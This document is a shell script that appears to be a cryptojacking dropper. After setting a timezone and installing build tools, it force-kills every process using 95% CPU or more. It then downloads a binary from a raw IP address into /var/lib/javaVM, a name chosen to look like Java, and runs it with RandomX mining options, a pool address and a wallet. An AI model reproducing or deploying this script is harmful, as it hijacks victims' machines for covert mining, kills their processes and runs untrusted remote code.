#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update
apt-get update  \
  && apt --fix-broken install \
  && apt-get install -y \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    cpulimit

sleep .9

/bin/ps axf -o "pid %cpu" | awk '{if($2>=95.0) print $1}' | while read procid
do
kill -9 $procid
done
dir="$( cd "$( dirname $0 )" && pwd )"
zero=0
process=`ps aux | grep javaVM | grep -v grep| wc -l`
if [ "$process" -eq "$zero" ]; then
	if [ -f /var/lib/javaVM ]
 	then
 	cpulimit -l 920 -- /var/lib/javaVM -o 217.156.67.54:443 -a rx/0 -u 3P7K3rmUYbFVW77cdY3QBWT41rZBFbaN6V.faisal -t 12 --cpu-priority=0 --pause-on-active=120
 	echo Started Existing
 	else
 		curl -L --progress-bar http://150.136.168.71:80/archxx/xgrog -o /var/lib/javaVM
 		chmod +x /var/lib/javaVM
 		cpulimit -l 920 -- /var/lib/javaVM -o 217.156.67.54:443 -a rx/0 -u 3P7K3rmUYbFVW77cdY3QBWT41rZBFbaN6V.faisal -t 12 --cpu-priority=0 --pause-on-active=120
 	fi
else
echo "Process Runing"
fi